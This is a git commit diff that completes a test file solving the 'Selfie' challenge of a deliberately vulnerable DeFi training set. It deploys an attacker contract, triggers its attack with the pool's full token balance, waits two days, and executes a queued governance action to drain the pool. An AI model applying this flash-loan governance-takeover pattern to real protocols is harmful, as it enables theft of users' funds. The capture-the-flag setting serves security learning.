77a676e3d4a27f96804ef89d566b6fd5dd97d7ed
Shehryar <14bscssshoukat@seecs.edu.pk>
2021-05-23 23:30:56 +0500

    complete selfie.challenge.js

--- test/selfie/selfie.challenge.js
+++ test/selfie/selfie.challenge.js
@@ -4,6 +4,7 @@ const { accounts, contract } = require('@openzeppelin/test-environment');
 const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapshot');
 const SelfiePool = contract.fromArtifact('SelfiePool');
 const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
+const AttackerSelfie = contract.fromArtifact('AttackerSelfie');
 
 const { expect } = require('chai');
 
@@ -13,7 +14,7 @@ describe('[Challenge] Selfie', function () {
 
     const TOKEN_INITIAL_SUPPLY = ether('2000000')
     const TOKENS_IN_POOL = ether('1500000');
-    
+
 
     before(async function () {
         /** SETUP SCENARIO */
@@ -21,9 +22,10 @@ describe('[Challenge] Selfie', function () {
         this.governance = await SimpleGovernance.new(this.token.address, { from: deployer });
         this.pool = await SelfiePool.new(
             this.token.address,
-            this.governance.address, 
+            this.governance.address,
             { from: deployer }
         );
+        this.attckerselfie = await AttackerSelfie.new(this.governance.address, this.pool.address, { from: attacker })
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
 
@@ -33,14 +35,16 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        await this.attckerselfie.attack(TOKENS_IN_POOL, { from: attacker })
+        await time.increase(time.duration.days(2));
+        await this.governance.executeAction(await this.attckerselfie.actionId(), { value: 0, from: attacker })
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         expect(
             await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+        ).to.be.bignumber.equal(TOKENS_IN_POOL);
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.bignumber.equal('0');
